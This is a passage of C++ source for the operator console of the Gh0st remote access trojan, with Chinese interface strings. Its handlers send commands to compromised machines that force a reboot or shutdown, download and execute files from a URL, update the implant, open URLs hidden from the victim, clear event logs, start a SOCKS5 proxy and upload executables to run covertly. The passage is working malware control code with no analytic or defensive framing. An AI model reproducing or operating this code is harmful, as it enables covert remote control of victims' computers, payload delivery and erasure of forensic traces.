	// TODO: Add your command handler code here
	if (MessageBox("确认重启服务端吗", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}

void CGh0stView::OnShutdown() 
{
	// TODO: Add your command handler code here
	if (MessageBox("确认关闭服务端吗", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}

void CGh0stView::OnDownexec() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("下载者"), _T("请输入要下载文件的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_EXEC;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CGh0stView::OnUpdateServer() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("下载更新服务端"), _T("请输入要下载新服务端的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_UPDATE_SERVER;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CGh0stView::OnOpenUrlHide() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要隐藏访问的网址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_HIDE;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;	
}

void CGh0stView::OnOpenUrlShow() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要显示访问的网址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_SHOW;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
}

void CGh0stView::OnCleanevent() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_CLEAN_EVENT;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGh0stView::OnSelectAll() 
{
	// TODO: Add your command handler code here
//	CXTPReportSelectedRows* SelRows = m_wndReport.GetSelectedRows();
//	int nCount = m_wndReport.GetRecords()->GetCount();
// 	int nCount = m_wndReport.GetRows()->GetCount();
// 	for (int i = 0; i < nCount; i++)
// 	{	
// 		if (m_wndReport.GetRows()->GetAt(i)->GetParentRow())
// 			continue;		
// 		m_wndReport.GetRows()->GetAt(i)->SelectChilds();
// 	}
	int nCount = m_wndReport.GetRows()->GetCount();
	for (int i = 0; i < nCount; i++)
	{
		if (!m_wndReport.GetRows()->GetAt(i)->GetParentRow())
 			continue;
		m_wndReport.GetRows()->GetAt(i)->SetSelected(TRUE);
	}
}

void CGh0stView::OnUnselectAll() 
{
	// TODO: Add your command handler code here
	int nCount = m_wndReport.GetRows()->GetCount();
	for (int i = 0; i < nCount; i++)
	{
		m_wndReport.GetRows()->GetAt(i)->SetSelected(FALSE);
	}
}

void CGh0stView::OnChangegroup() 
{
	// TODO: Add your command handler code here
	CString str, strName;
	CChangeGroup m_group;
	BOOL bFind = FALSE;
	CXTPReportRecord* pParentRecord = NULL;
	if (m_group.DoModal() == IDOK)
	{	
		int	nPacketLength = m_group.strGroup.GetLength() + 2;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_CHANGE_GROUP;
		memcpy(lpPacket + 1, m_group.strGroup.GetBuffer(0), nPacketLength - 1);
		SendSelectCommand(lpPacket, nPacketLength);

		CXTPReportSelectedRows* SelRows = m_wndReport.GetSelectedRows();
		POSITION pos = SelRows->GetFirstSelectedRowPosition();
		while(pos)
		{
			CXTPReportRow* SelNext = SelRows->GetNextSelectedRow(pos);
			if (!SelNext->GetParentRow())
				continue;
			int nGroup = m_wndReport.GetRecords()->GetCount();
			for (int i = 0; i < nGroup; i++)
			{	
				strName = m_wndReport.GetRecords()->GetAt(i)->GetItem(0)->GetTooltip();
				if (m_group.strGroup == strName)
				{
					bFind = TRUE;
					pParentRecord = m_wndReport.GetRecords()->GetAt(i);
					break;
				}
			}
			if (!bFind)
				pParentRecord = m_wndReport.AddRecord(new CRecordPropertyGroup(-1, m_group.strGroup));
			CXTPReportRecord* RAdd = NULL;
			DWORD_PTR dwItemData = NULL;
			for (int n = 0; n < m_wndReport.GetColumns()->GetCount(); n++)
			{
				str = SelNext->GetRecord()->GetItem(n)->GetCaption(m_wndReport.GetColumns()->GetAt(n));
				if (n == 1)
				{
					dwItemData = SelNext->GetRecord()->GetItem(n)->GetItemData();
				}
				if (n == 0)
				{	
					RAdd = pParentRecord->GetChilds()->Add(new CRecordPropertyGroup(0, str));
				}
				else
				{	
					if (n == 1)
						RAdd->AddItem(new CRecordPropertyIcon(-1, str))->SetItemData(dwItemData);
					else
						RAdd->AddItem(new CRecordPropertyIcon(-1, str));
				}		
			}
			SelNext->GetRecord()->Delete();
			pParentRecord->SetExpanded(TRUE);
			m_wndReport.Populate();
		}
		UpGroupNum();
	}
}

void CGh0stView::OnRenameRemark() 
{
	// TODO: Add your command handler code here
	CString strTitle;
	strTitle = _T("更改主机备注");
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("请输入新的备注:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength*sizeof(TCHAR)];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), (nPacketLength - 1)*sizeof(TCHAR));
	
	SendSelectCommand(lpPacket, nPacketLength*sizeof(TCHAR));
	
	CXTPReportSelectedRows* SelRows = m_wndReport.GetSelectedRows();
	POSITION pos = SelRows->GetFirstSelectedRowPosition();
	while(pos)
	{
		CXTPReportRow* NextRow = SelRows->GetNextSelectedRow(pos);
		CXTPReportRecord* Record = NextRow->GetRecord();
		if (!Record->GetParentRecord())
			continue;
		//ClientContext* pContext = (ClientContext*)Record->GetItem(1)->GetItemData();
		Record->GetItem(3)->SetCaption(dlg.m_str);
		//m_iocpServer->Send(pContext, pData, nSize);
	}
	delete[] lpPacket;			
}

void CGh0stView::OnSendMsg() 
{
	// TODO: Add your command handler code here
	CSendMsg dlg;
	dlg.DoModal();
}

void CGh0stView::OnProxy() 
{
	one:	// TODO: Add your command handler code here
	CClienttProxy dlg;
	char socks5info[100] = "\0";
	char *a = "|";

	if(dlg.DoModal() != IDOK) return;

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt(_T("代理信息"), _T("Socks5"), dlg.m_socks5);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("代理信息"), _T("代理端口"), dlg.m_proxy_port);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("代理信息"), _T("帐号"), dlg.m_proxy_user);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("代理信息"), _T("密码"), dlg.m_proxy_pass);

	if(dlg.m_socks5)
	{	
		dlg.m_proxy_user.MakeLower();
		if (strlen(dlg.m_proxy_user) < 1 | strlen(dlg.m_proxy_pass) < 1)
		{
			MessageBox(_T("请输入用户名和密码!!"), _T("错误"));
			goto one;
		}
		strcat(socks5info, dlg.m_proxy_port);
		strcat(socks5info, a);
		strcat(socks5info, dlg.m_proxy_user);
		strcat(socks5info, a);
		strcat(socks5info, dlg.m_proxy_pass);
	}
	else
	{
		strcpy(socks5info,dlg.m_proxy_port);
	}

	int nPacketLength = (strlen(socks5info) + 2);
	LPBYTE lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_OPEN_PROXY;
	//	char *tempurl = dlg.m_str.GetBuffer(dlg.m_str.GetLength() + 1);	//CString转换为char*
	memcpy(lpPacket + 1, socks5info, nPacketLength);
	SendSelectCommand(lpPacket, nPacketLength - 1);
	LocalFree(lpPacket);	
}

void CGh0stView::OnRegedit() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_REGEDIT;
	SendSelectCommand(&bToken,sizeof(BYTE));
}

void CGh0stView::OnServices() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SERVERS;
	SendSelectCommand(&bToken,sizeof(BYTE));
}

void CGh0stView::OnStartHide() 
{
	// TODO: Add your command handler code here
	AfxMessageBox("将上传至远程电脑系统盘的Program Files文件夹下，传输的文件过大时会有假死现象，请耐心等候");

	CFileDialog *dlg = new CFileDialog(TRUE, "exe", "*.exe", OFN_HIDEREADONLY,"可执行文件|*.exe", NULL);
	if(dlg->DoModal () != IDOK) 
		return;
	unsigned char *data = NULL;   
	size_t size;   

	FILE *file=fopen(dlg->GetPathName(),"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("文件读取失败！");  
		return;  
	}
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	int		nPacketLength = size + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SENDFILE_HIDE;
	memcpy(lpPacket + 1, data, nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	if (data)
		free(data);
	delete[] lpPacket;
	delete dlg;
}

void CGh0stView::OnStartNormal() 
{
	// TODO: Add your command handler code here
	AfxMessageBox("将上传至远程电脑系统盘的Program Files文件夹下，传输的文件过大时会有假死现象，请耐心等候");

	CFileDialog *dlg = new CFileDialog(TRUE, "exe", "*.exe", OFN_HIDEREADONLY,"可执行文件|*.exe", NULL);
	if(dlg->DoModal () != IDOK) 
		return;
	//	AfxMessageBox(dlg->GetPathName());
	unsigned char *data = NULL;   
	size_t size;   
	
	FILE *file=fopen(dlg->GetPathName(),"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("文件读取失败！");  
		return;  
	}
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	int		nPacketLength = size + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SENDFILE_NORMAL;
	memcpy(lpPacket + 1, data, nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	if (data)
		free(data);
	delete[] lpPacket;
	delete dlg;
}

void CGh0stView::OnNoStart() 
{
	// TODO: Add your command handler code here
	AfxMessageBox("将上传至远程电脑系统盘的Program Files文件夹下，传输的文件过大时会有假死现象，请耐心等候");
	
	CFileDialog *dlg = new CFileDialog(TRUE, "exe", "*.exe", OFN_HIDEREADONLY,"可执行文件|*.exe", NULL);
	if(dlg->DoModal () != IDOK) 
		return;
	//	AfxMessageBox(dlg->GetPathName());
	unsigned char *data = NULL;   
	size_t size;   
	
	FILE *file=fopen(dlg->GetPathName(),"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("文件读取失败！");  
		return;  
	}
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	int		nPacketLength = size + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SENDFILE_NOSTART;
	memcpy(lpPacket + 1, data, nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	if (data)
		free(data);
	delete[] lpPacket;
	delete dlg;
}

void CGh0stView::OnstopSD() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_STOPFH;
	SendSelectCommand(&bToken, sizeof(BYTE));	
	MessageBox("命令已经发送","提示",NULL);
}




